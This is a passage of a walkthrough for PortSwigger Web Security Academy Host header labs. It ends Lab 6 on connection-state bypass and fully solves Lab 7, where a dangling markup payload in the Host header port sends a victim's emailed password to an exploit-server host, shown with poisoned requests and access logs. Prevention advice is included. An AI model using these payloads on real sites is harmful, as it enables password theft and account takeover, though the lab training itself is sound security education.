7. **Including `Connection: close`** - This forces connection closure

### Troubleshooting

**Issue:** Second request still fails
**Solution:** Verify you're using "Send group in sequence (single connection)", not sending individually

**Issue:** Connection closed message
**Solution:** Ensure both requests have `Connection: keep-alive`, remove any `Connection: close` headers

**Issue:** Feature not available
**Solution:** Update to Burp Suite 2022.8.1 or later

**Issue:** CSRF token invalid
**Solution:** Extract token from the second response of the connection sequence, not from individual requests

**Issue:** Tab group options missing
**Solution:** Must select multiple tabs and right-click to create group

### Real-World Impact

Connection state attacks enable:
- Bypassing seemingly robust Host header validation
- Exploiting stateful firewalls and proxies
- Access to internal resources through validation bypass
- Defeating request inspection systems
- Exploiting microservices with connection pooling

**Attack Scenarios:**
- Bypassing WAF validation through connection reuse
- Exploiting load balancers that validate first request only
- Accessing internal APIs behind reverse proxies
- Defeating rate limiting tied to Host header validation
- Exploiting CDNs that trust established connections

**Notable Characteristics:**
- Very difficult to detect through traditional monitoring
- Exploits fundamental HTTP/1.1 persistent connection design
- Affects multiple infrastructure components simultaneously
- Often overlooked in security assessments

### Prevention

- Validate Host header on every request, not just connection establishment
- Avoid making trust assumptions based on connection state
- Implement per-request validation at all infrastructure layers
- Consider using HTTP/2 or HTTP/3 with better connection management
- Monitor for suspicious request patterns within connections
- Implement strict connection timeouts
- Use stateless validation mechanisms
- Log and alert on Host header changes within connections
- Consider disabling HTTP persistent connections for sensitive endpoints

---

## Lab 7: Password Reset Poisoning via Dangling Markup

**Difficulty:** EXPERT
**Objective:** Exploit password reset to capture Carlos's password using dangling markup injection

### Vulnerability Description

This advanced lab combines password reset poisoning with dangling markup injection techniques. The application reflects the Host header into password reset emails and allows arbitrary ports in the Host header value. The port value is reflected inside a single-quoted string without proper escaping. Since email clients don't execute JavaScript, traditional XSS is ineffective, but dangling markup attacks can break out of the string context and exfiltrate the password that appears later in the email.

### Step-by-Step Solution

#### Phase 1: Establish Baseline

1. Request a password reset for your account (wiener:peter)
2. Check the exploit server's email client
3. Examine the email structure:
   ```
   Hello wiener!

   Please click here to reset your password:
   https://YOUR-LAB-ID.web-security-academy.net/forgot-password?token=abc123...

   Your new temporary password is: xY9zK7mP2q
   ```
4. Note that the password is sent directly in the email body

#### Phase 2: Analyze Email Rendering

5. Access `GET /email` in Burp Proxy
6. Examine the response - there are two views:
   - **Rendered view**: Protected by DOMPurify sanitization
   - **Raw HTML view**: No sanitization applied
7. The raw HTML is the exploitation target

#### Phase 3: Test Port Injection

8. Intercept the `POST /forgot-password` request
9. Send it to Repeater
10. Modify the Host header to include an arbitrary port:
    ```http
    POST /forgot-password HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net:8080
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 21

    username=wiener
    ```
11. Check your email - the port should be reflected in the password reset link
12. Test with a non-numeric port to confirm:
    ```http
    Host: YOUR-LAB-ID.web-security-academy.net:arbitrary
    ```

#### Phase 4: Analyze Reflection Context

13. View the raw HTML of the email
14. Locate where the Host header is reflected:
    ```html
    <a href='https://YOUR-LAB-ID.web-security-academy.net:arbitrary/forgot-password?token=...'>
    ```
15. Note the single quotes around the href attribute value
16. The password appears later in the HTML:
    ```html
    <p>Your temporary password is: xY9zK7mP2q</p>
    ```

#### Phase 5: Craft Dangling Markup Payload

17. Design a payload that breaks out of the quoted string and creates an unclosed anchor tag:
    ```
    YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
    ```

18. The resulting HTML will be:
    ```html
    <a href='https://YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?/forgot-password?token=...'>
    ...
    <p>Your temporary password is: xY9zK7mP2q</p>
    ```

19. The unclosed second `<a href="` will capture everything until the next quote, including the password

#### Phase 6: Test on Your Account

20. Send the poisoned request with your account:
    ```http
    POST /forgot-password HTTP/1.1
    Host: 0a1b2c3d4e5f6g7h.web-security-academy.net:'<a href="//exploit-0a9b8c7d6e5f4g3h.exploit-server.net/?
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 21

    username=wiener
    ```

21. Check your exploit server access logs
22. Look for a GET request containing your password:
    ```
    GET /?/login'>Click here</a>...Your temporary password is: xY9zK7mP2q HTTP/1.1
    ```

#### Phase 7: Target Carlos

23. Modify the username parameter to target Carlos:
    ```http
    POST /forgot-password HTTP/1.1
    Host: 0a1b2c3d4e5f6g7h.web-security-academy.net:'<a href="//exploit-0a9b8c7d6e5f4g3h.exploit-server.net/?
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 21

    username=carlos
    ```

24. Send the request
25. Check your exploit server access logs
26. Extract Carlos's password from the log entry
27. Login as carlos with the captured password
28. Lab solved!

### HTTP Requests/Responses

**Standard Password Reset:**
```http
POST /forgot-password HTTP/1.1
Host: 0a1b2c3d4e5f6g7h.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

username=wiener

HTTP/1.1 302 Found
Location: /forgot-password
Content-Length: 0
```

**Email Generated (Standard):**
```html
<html>
<body>
    <p>Hello wiener!</p>
    <p>Please <a href='https://0a1b2c3d4e5f6g7h.web-security-academy.net/forgot-password?token=abc123def456'>click here</a> to reset your password.</p>
    <p>Your temporary password is: Kp8mN3xQ9r</p>
</body>
</html>
```

**Poisoned Password Reset Request:**
```http
POST /forgot-password HTTP/1.1
Host: 0a1b2c3d4e5f6g7h.web-security-academy.net:'<a href="//exploit-0a9b8c7d6e5f4g3h.exploit-server.net/?
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

username=carlos

HTTP/1.1 302 Found
Location: /forgot-password
Content-Length: 0
```

**Email Generated (Poisoned - Raw HTML):**
```html
<html>
<body>
    <p>Hello carlos!</p>
    <p>Please <a href='https://0a1b2c3d4e5f6g7h.web-security-academy.net:'<a href="//exploit-0a9b8c7d6e5f4g3h.exploit-server.net/?/forgot-password?token=xyz789ghi012'>click here</a> to reset your password.</p>
    <p>Your temporary password is: Wr7yT4mX2z</p>
</body>
</html>
```

**Exploit Server Access Log:**
```
10.0.3.67       2026-01-10 14:23:45 +0000 "GET /?/forgot-password?token=xyz789ghi012'>click here</a> to reset your password.</p><p>Your temporary password is: Wr7yT4mX2z HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (compatible; EmailClient/1.0)"
```

### Key Exploitation Techniques

- **Dangling Markup Injection**: Creating unclosed HTML tags to capture subsequent content
- **Context Breaking**: Escaping from attribute value context
- **Email HTML Exploitation**: Targeting raw HTML that bypasses DOM sanitization
- **Password Exfiltration**: Capturing plaintext passwords from email content
- **Port Field Abuse**: Exploiting insufficient validation of port numbers in Host headers

### Burp Suite Features Used

- **Repeater**: Test and refine dangling markup payloads
- **Proxy**: Intercept and analyze password reset requests
- **Exploit Server**: Capture exfiltrated data via access logs
- **Email Client**: View generated emails and raw HTML

### Common Mistakes

1. **Using numeric ports** - The application validates and rejects numeric ports
2. **Including protocol in Host header** - Don't use `http://` or `https://` in Host header
3. **Incorrect quote escaping** - The payload must use the same quote type to break out
4. **Forgetting to check raw HTML** - The rendered view is sanitized; raw HTML is the target
5. **Not URL-encoding the payload** - Some special characters may need encoding
6. **Wrong anchor tag syntax** - Must create a valid but unclosed `<a href="` tag
7. **Missing the trailing `?`** - The question mark captures the rest as query parameters

### Troubleshooting

**Issue:** No request appears in access logs
**Solution:** Verify the Host header syntax - no `http://`, single quote before `<a`

**Issue:** Request appears but no password
**Solution:** Check the raw HTML of the email to verify proper injection

**Issue:** DOMPurify sanitizes the payload
**Solution:** This is expected in rendered view; victim receives raw HTML

**Issue:** Password not in access logs
**Solution:** Look for URL-encoded characters; the password may be encoded

**Issue:** Lab doesn't solve after login
**Solution:** Verify you're logged in as `carlos`, not `wiener`

### Real-World Impact

Dangling markup attacks in email contexts enable:
- Password theft without JavaScript execution
- Bypassing XSS protections in email clients
- Token theft from password reset emails
- Exfiltration of sensitive email content
- CSRF token capture from email notifications

**Attack Scenarios:**
- Compromising accounts through password reset poisoning
- Stealing 2FA codes sent via email
- Capturing API keys and tokens from automated emails
- Exfiltrating personal information from email notifications
- Session hijacking through email-based reset links

**Why Email Clients Are Vulnerable:**
- Email clients don't execute JavaScript
- Traditional XSS defenses don't apply
- Dangling markup works in pure HTML contexts
- Email HTML is often less sanitized than web content
- Users trust email content more than web pages

### Prevention

- Validate and sanitize all inputs reflected in emails, including Host header and port values
- Use configuration-based domain values instead of user-controllable headers
- Implement strict parsing and validation of Host header components
- Encode all output in emails with proper HTML entity encoding
- Reject Host headers containing non-standard characters
- Don't include sensitive information (passwords, tokens) in email body
- Use token-only reset links, never include credentials in emails
- Implement Content Security Policy for email HTML
- Sanitize HTML in both rendered and raw email formats
- Monitor for suspicious Host header patterns

---

## Summary Matrix

| Lab | Difficulty | Primary Technique | Key Vulnerability | Impact |
|-----|-----------|-------------------|-------------------|--------|
| Basic Password Reset Poisoning | APPRENTICE | Host Header Injection | Untrusted Host in URL generation | Account takeover |
| Host Header Authentication Bypass | APPRENTICE | Header Spoofing | Authorization based on Host | Admin access |
| Web Cache Poisoning via Ambiguous Requests | PRACTITIONER | Duplicate Headers | Inconsistent parsing | Mass XSS |
| Routing-Based SSRF | PRACTITIONER | Internal Routing | Host-based routing | Internal network access |
| SSRF via Flawed Request Parsing | PRACTITIONER | Absolute URL | Validation bypass | Internal API access |
| Host Validation Bypass via Connection State | EXPERT | Connection Reuse | Stateful validation | Validation bypass |
| Password Reset Poisoning via Dangling Markup | EXPERT | Dangling Markup | Insufficient encoding | Password theft |

## Common Attack Patterns

### 1. Password Reset Poisoning
- Manipulate Host header in password reset requests
- Capture tokens via attacker-controlled domain
- Use tokens to reset victim passwords

### 2. Authentication Bypass
- Spoof Host header to match internal/localhost values
- Access restricted admin interfaces
- Bypass IP-based access controls

### 3. Cache Poisoning
- Inject malicious content via Host header manipulation
- Poison cache with attacker-controlled resources
- Affect multiple users through cached responses

### 4. SSRF Exploitation
- Use Host header to access internal networks
- Scan internal IP ranges
- Access cloud metadata services
- Interact with internal APIs

### 5. Connection State Exploitation
- Establish trust with legitimate request
- Exploit connection reuse for malicious requests
- Bypass per-request validation

### 6. Dangling Markup
- Break out of HTML contexts
- Exfiltrate sensitive data from emails
- Bypass sanitization through unclosed tags

## Tools and Techniques

### Burp Suite Features
- **Repeater**: Test individual requests with modified headers
- **Intruder**: Automate scanning and fuzzing
- **Collaborator**: Detect out-of-band interactions
- **Tab Groups**: Organize connection state attacks
- **Connection Sequencing**: Critical for connection state attacks
- **Exploit Server**: Capture tokens and exfiltrated data

### Testing Methodologies
1. **Discovery**: Identify Host header handling
2. **Validation**: Test header modification acceptance
3. **Reflection**: Find where header values appear
4. **Exploitation**: Craft appropriate payloads
5. **Verification**: Confirm successful exploitation

### Payload Crafting
- Host header spoofing: `localhost`, `127.0.0.1`, internal IPs
- Duplicate headers: Multiple Host headers in one request
- Absolute URLs: Full URLs in request line
- Override headers: `X-Forwarded-Host`, `X-Forwarded-Server`
- Port injection: Arbitrary ports for injection vectors
- Dangling markup: Unclosed HTML tags for exfiltration

## Key Takeaways

1. **Never trust the Host header** - It's user-controllable input
2. **Validate consistently** - All layers must validate the same way
3. **Use configuration-based domains** - Don't derive domains from requests
4. **Test for parsing discrepancies** - Different systems may handle headers differently
5. **Consider connection state** - Validate every request, not just connections
6. **Sanitize email content** - Email HTML is often less protected than web content
7. **Monitor for anomalies** - Unusual Host headers may indicate attacks

---

*This comprehensive guide provides everything needed to understand and exploit HTTP Host header vulnerabilities through hands-on practice with PortSwigger Web Security Academy labs.*
